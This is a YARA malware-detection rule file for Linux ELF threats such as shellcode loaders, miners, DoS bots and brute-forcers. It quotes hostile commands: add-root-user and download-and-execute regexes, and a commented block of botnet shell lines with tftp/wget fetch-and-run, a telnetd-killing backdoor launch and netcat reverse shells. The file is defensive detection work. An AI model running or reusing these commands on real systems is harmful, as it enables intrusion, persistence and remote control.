import "elf"


private rule is_elf {
  condition:
    uint32(0) == 0x464c457f
}

private rule elf_no_sections {
  condition:
    is_elf and elf.number_of_sections == 0
}

rule Shellcode_Executor
{
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Try to detect shellcode executor by exported \"shellcode\" string"
  condition:
    is_elf and for any i in (0 .. elf.symtab_entries - 1): (
      (elf.symtab[i].name == "shellcode" or elf.symtab[i].name == "code" or elf.symtab[i].name == "buf") and elf.symtab[i].type == elf.STT_OBJECT
    )
}

rule ELF_NoSections {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Suspicious ELF files. File has no section and file size < 1KB. Usually see by Metasploit's stageless payloads"
  condition:
    elf_no_sections and filesize < 1KB
}

rule OSCommand_Add_user {
  meta:
    description = "Bash commands to add new user to passwd"
    author = "Nong Hoang Tu"
    date = "12/11/2021"
    target = "File, process's cmd, memory"
  strings:
    $1 = /echo[ "]+[\w\d_]+::0:0::\/:\/bin\/[\w"]+[ >]+\/etc\/passwd/
  condition:
    all of them
}

rule OSCommand_Wget_Downloader {
  meta:
    description = "Bash commands to download and execute binaries using wget"
    reference = "https://www.trendmicro.com/en_us/research/19/d/bashlite-iot-malware-updated-with-mining-and-backdoor-commands-targets-wemo-devices.html"
    author = "Nong Hoang Tu"
    date = "12/11/2021"
    target = "File, process's cmd, memory"
  strings:
    $re1 = /wget([ \S])+[; ]+chmod([ \S])+\+x([ \S])+[; ]+.\/(\S)+/
  condition:
    all of them
}

rule OSCommand_Curl_Downloader {
  meta:
    description = "Bash commands to download and execute binaries using CURL"
    refrence = "https://otx.alienvault.com/indicator/file/2557ee8217d6bc7a69956e563e0ed926e11eb9f78e6c0816f6c4bf435cab2c81"
    author = "Nong Hoang Tu"
    date = "12/11/2021"
    target = "File, process's cmd, memory"
  strings:
    $re1 = /curl([ \S])+\-O([ \S])+[; ]+cat([ >\.\S])+[; ]+chmod([ \S])+\+x([ \S\*])+[; ]+.\/([\S ])+/
  condition:
    all of them
}

rule CoinMiner
{
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
  strings:
    $1 = "Memory: %u KiB, Iterations: %u, Parallelism: %u lanes, Tag length: %u bytes"
    $2 = "Block %.4u [%3u]: %016lx"
  condition:
    is_elf and all of them
}

rule Hacktool_DenialOfService {
  meta:
    author = "Nong Hoang Tu"
    description = "Botnet.Linux.LizardSquad"
    email = "dmknght@parrotsec.org"
    date = "12/11/2021"
    target = "File, memory"
  strings:
    $1 = "JUNK Flooding %s:%d"
    $2 = "UDP Flooding %s"
    $3 = "TCP Flooding %s"
    $4 = "LOLNOGTFO"
    $5 = "KILLATTK"
  condition:
    2 of them
}

rule Hacktool_LoginBrute {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "12/11/2021"
    target = "File, memory"
  strings:
    $1 = "p@ck3tf3nc3"
    $2 = "7ujMko0"
    $3 = "s4beBsEQhd"
    $4 = "ROOT500"
    $5 = "LSiuY7pOmZG2s"
    $6 = "gwevrk7f@qwSX$fd"
    $7 = "huigu309"
    $8 = "taZz@23495859"
    $9 = "hdipc%No"
    $10 = "DFhxdhdf"
    $11 = "XDzdfxzf"
    $12 = "UYyuyioy"
    $13 = "JuYfouyf87"
    $14 = "NiGGeR69xd"
    $15 = "NiGGeRD0nks69"
    $16 = "TY2gD6MZvKc7KU6r"
    $17 = "A023UU4U24UIU"
    $18 = "scanJosho"
    $19 = "S2fGqNFs"
    $20 = "7ujMko0admin"
  condition:
    any of them
}
// rule OSCommand_WgetAndCurl_Downloader {
//   meta:
//     description = "Bash commands to download and execute binaries using CURL || Wget"
//     author = "Nong Hoang Tu"
//     date = "12/11/2021"
//     target = "File, process's cmd, memory"
//   strings:
//     $re1 = /wget([ \S])+[ ]+||[ ]+curl([ \S])+\-O([ \S])+[; ]+chmod([ \S])+\+x([ \S\*])+[; ]+/
//   condition:
//     all of them
// }

// rule OSCommand_Syslog_Removal {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     description = "Bash command to remove everything in /var/log/"
//     date = "12/11/2021"
//     refrence = "https://otx.alienvault.com/indicator/file/6138054a7de11c23b5c26755d7548c4096fa547cbb964ac78ef0fbe59d16c2da"
//   strings:
//     $ = /rm(\/var\/log[\S\/ \-]+|\-rf|[ ])+/
//   condition:
//     all of them
// }

rule SingleLoadRWE_Tenable
{
  meta:
    description = "Flags binaries with a single LOAD segment marked as RWE."
    family = "Stager"
    filetype = "ELF"
    hash = "711a06265c71a7157ef1732c56e02a992e56e9d9383ca0f6d98cd96a30e37299"
    reference = "https://github.com/tenable/yara-rules/blob/master/generic/elf_format.yar#L3"
    reference = "https://www.tenable.com/blog/hunting-linux-malware-with-yara"
    target = "File, memory"

  condition:
    elf.number_of_segments == 1 and
    elf.segments[0].type == elf.PT_LOAD and
    elf.segments[0].flags == elf.PF_R | elf.PF_W | elf.PF_X
}

rule FakeSectionHeadersConflictEntryPointAddr_Tenable {
  meta:
    description = "A fake sections header has been added to the binary."
    family = "Obfuscation"
    filetype = "ELF"
    hash = "a2301180df014f216d34cec8a6a6549638925ae21995779c2d7d2827256a8447"
    reference = "https://github.com/tenable/yara-rules/blob/master/generic/elf_format.yar#L17"
    target = "File, memory"
  condition:
    elf.type == elf.ET_EXEC and
    elf.entry_point < filesize and // file scanning only
    elf.number_of_segments > 0 and
    elf.number_of_sections > 0 and
    not
    (
      for any i in (0..elf.number_of_segments):
      (
        (elf.segments[i].offset <= elf.entry_point) and
        ((elf.segments[i].offset + elf.segments[i].file_size) >= elf.entry_point) and
        for any j in (0..elf.number_of_sections):
        (
          elf.sections[j].offset <= elf.entry_point and
          ((elf.sections[j].offset + elf.sections[j].size) >= elf.entry_point) and
          (elf.segments[i].virtual_address + (elf.entry_point - elf.segments[i].offset)) ==
          (elf.sections[j].address + (elf.entry_point - elf.sections[j].offset))
        )
      )
    )
}

rule FakeDynamicSymbols_Tenable {
  meta:
    description = "A fake dynamic symbol table has been added to the binary"
    family = "Obfuscation"
    filetype = "ELF"
    hash = "51676ae7e151a0b906c3a8ad34f474cb5b65eaa3bf40bb09b00c624747bcb241"
    reference = "https://github.com/tenable/yara-rules/blob/master/generic/elf_format.yar#L47"
    target = "File, memory"
  condition:
    elf.type == elf.ET_EXEC and
    elf.entry_point < filesize and // file scanning only
    elf.number_of_sections > 0 and
    elf.dynamic_section_entries > 0 and
    for any i in (0..elf.dynamic_section_entries):
    (
      elf.dynamic[i].type == elf.DT_SYMTAB and
      not
      (
        for any j in (0..elf.number_of_sections):
        (
          elf.sections[j].type == elf.SHT_DYNSYM and
          for any k in (0..elf.number_of_segments):
          (
            (elf.segments[k].virtual_address <= elf.dynamic[i].val) and
            ((elf.segments[k].virtual_address + elf.segments[k].file_size) >= elf.dynamic[i].val) and
            (elf.segments[k].offset + (elf.dynamic[i].val - elf.segments[k].virtual_address)) == elf.sections[j].offset
          )
        )
      )
    )
}

// rule SuspiciousEnvironmentVariable {
//   // Malicious exports:
//   //  export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s
//     // export HOME=/tmp;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;trap '' 1 2; sh -c '%s'&
//     // export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;%s
//     // export fileGet=busybox;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;cd /var;(([ ! -e /var/"$fileGet" ] || [ ! -s /var/"$fileGet" ]) && tftp -g -r "$fileGet" %s && chmod +x "$fileGet" && ./"$fileGet" mkdir bin && ./"$fileGet" --install -s /var/bin && ls -l "$fileGet" || echo It appears we already have /var/"$fileGet")
//     // export fileGet=busybox;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;cd /var;(([ ! -e /var/"$fileGet" ] || [ ! -s /var/"$fileGet" ]) && tftp -g -r "$fileGet" %s && chmod +x "$fileGet" && ./"$fileGet" mkdir bin && ./"$fileGet" --install -s /var/bin && ls -l "$fileGet" || echo It appears we already have /var/"$fileGet")
//     // export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo "$url" | sed 's#.*/##'`;(([ ! -e /var/bin/$name ] || [ ! -s /var/bin/$name ]) && echo "$name either doesnt exist or eq 0 so we get" && cd /tmp && wget -O "$name" "$url" && chmod +x "$name" && mv "$name" /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo "It appears I already have $name")
//     // export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo "$url" | sed 's#.*/##'`;([ -e /var/bin/$name ]) && echo $name exists so we delete it... && rm /var/bin/$name && cd /tmp && wget -O $name $url && chmod +x $name && mv $name /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo "$name doesnt exist, perhaps you mean INSTALL?"
//     // export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;export HOME=/tmp;[ ! -f /var/bin/bd ] && cd /var/bin;wget -O bd %s;chmod +x /var/bin/bd;(killall -9 telnetd || kill -9 telnetd) && (nohup bd || trap '' 1 2 /var/bin/bd &)
//     // export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;trap '' 1 2; sh -c 'nc %s -e /bin/sh '&
//     // export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;(([ ! -x /var/bin/scan ] || [ ! -x /var/bin/nmap ]) && echo "I am missing either scan or nmap, and Shellzrus was on Xanax when he wrote this, so you need to do INSTALL http:/server/nmap and INSTALL http://server/scan first..." && ([ -f /var/bin/nmap ] && ls -l /var/bin/nmap) && ([ -f /var/bin/scan ] && ls -l /var/bin/scan) || scan %s)
//     // export HOME=/tmp;export SHELL=/var/bin/bash;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;%s
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     description = "Regex to find suspicious environment variables"
//     date = "14/11/2021"
//     reference = "https://otx.alienvault.com/indicator/file/3e657fb9543777fea0f8399169a4dbb4b235213396bfd911e2322625f6f5a001"
//     hash = "553ac527d6a02a84c787fd529ea59ce1eb301ddfb180d89b9e62108d92894185"
//     hash = "305901aa920493695729132cfd20cbddc9db2cf861071450a646c6a07b4a50f3"
//     hash = "7a60c84fb34b2b3cd7eed3ecd6e4a0414f92136af656ed7d4460b8694f2357a7"
//     hash = "e2125d9ce884c0fb3674bd12308ed1c10651dc4ff917b5e393d7c56d7b809b87"
//   strings:
//     $ = /^(export [\w]+[=\/\w+:; '"%\.\(\)\-\[\]\`\!\$\|\&#\*,?]+)+$/
//   condition:
//     all of them
// }